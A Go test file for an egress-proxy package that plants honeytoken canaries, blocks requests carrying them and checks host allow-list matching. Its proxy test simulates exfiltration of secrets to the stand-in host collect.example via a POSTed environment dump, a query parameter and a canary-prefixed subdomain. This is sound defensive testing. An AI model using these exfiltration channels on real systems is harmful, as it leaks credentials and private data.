package egress

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
)

func TestNewCanariesAreRandomAndMatch(t *testing.T) {
	a, err := NewCanaries(nil)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := NewCanaries(nil)
	if len(a) != 2 || a[0].Value == b[0].Value {
		t.Fatalf("canaries not fresh: %v %v", a, b)
	}
	if c, ok := MatchCanary(a, "POST body: x="+a[1].Value+"&y=1"); !ok || c.Name != a[1].Name {
		t.Fatalf("no match: %v %v", c, ok)
	}
	// The name alone, or another session's value, is not a hit.
	for _, s := range []string{a[0].Name, b[0].Value, "", "dtk_"} {
		if _, ok := MatchCanary(a, s); ok {
			t.Errorf("%q matched", s)
		}
	}
	if _, ok := MatchCanary(nil, a[0].Value); ok {
		t.Error("no canaries matched something")
	}
	if !strings.HasPrefix(a[0].Env(), a[0].Name+"=") {
		t.Errorf("Env = %q", a[0].Env())
	}
}

func TestProxyRefusesACanary(t *testing.T) {
	cs, _ := NewCanaries(nil)
	p, rec := proxyFor(t, &Policy{Default: Ask}, func(string) bool { return true })
	var hits []string
	p.Canaries = func() []Canary { return cs }
	p.OnCanary = func(h string) { hits = append(hits, h) }

	// An ordinary request passes, its body intact.
	pu, _ := url.Parse("http://" + p.Addr())
	c := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(pu)}}
	resp, err := c.Post("http://example.org/ok", "text/plain", strings.NewReader("hello"))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 || len(hits) != 0 {
		t.Fatalf("clean POST: %d, hits %v", resp.StatusCode, hits)
	}

	// The environment in a POST body.
	body := bytes.NewBufferString("HOME=/root\n" + cs[0].Env() + "\n")
	resp, err = c.Post("http://collect.example/x", "text/plain", body)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 403 || !strings.Contains(string(b), "honeytoken") {
		t.Fatalf("canary POST: %d %q", resp.StatusCode, b)
	}
	// In a query string, and as a subdomain of a CONNECT target.
	if code, _ := get(t, p, "http://collect.example/?k="+cs[1].Value); code != 403 {
		t.Fatalf("canary in the URL: %d", code)
	}
	if line := connect(t, p, cs[0].Value+".collect.example:443"); !strings.Contains(line, "403") {
		t.Fatalf("canary in CONNECT: %q", line)
	}
	if len(hits) != 3 || hits[0] != "collect.example" {
		t.Fatalf("hits = %v", hits)
	}
	if !strings.Contains(rec.Current().Text(), "honeytoken") {
		t.Errorf("the report does not show it:\n%s", rec.Current().Text())
	}
}

func TestListed(t *testing.T) {
	var nilPol *Policy
	p := &Policy{Default: Allow, Allow: []string{"*.golang.org"}, Implicit: []string{"api.provider.example"}}
	if !p.Listed("sum.golang.org") || !p.Listed("API.provider.example.") {
		t.Fatal("a listed host is not Listed")
	}
	if p.Listed("golang.org.evil.example") || p.Listed("evil.example") || nilPol.Listed("x") {
		t.Fatal("an unlisted host is Listed")
	}
}
